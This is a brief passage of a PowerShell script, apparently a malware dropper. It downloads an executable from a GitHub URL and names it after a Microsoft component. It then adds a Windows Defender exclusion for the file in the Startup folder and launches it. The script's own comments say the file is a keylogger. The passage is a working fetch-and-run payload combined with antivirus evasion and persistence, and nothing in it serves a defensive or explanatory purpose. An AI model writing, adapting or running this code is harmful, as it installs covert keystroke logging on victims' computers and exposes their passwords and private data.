...
Invoke-WebRequest "https://github.com/Aroft-Developer/NBVCXWMLKJHGFDSQPOIUYTTREEZE/raw/main/MicrosoftStartFeed.exe" -OutFile "MicrosoftStarterFeed.exe"#Download keylogger script
Add-MpPreference -ExclusionPath $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup\MicrosoftStarterFeed.exe -Force #Add exception for keylogger.exe file in antivirus
Start-Process MicrosoftStarterFeed.exe #Start keylogger script
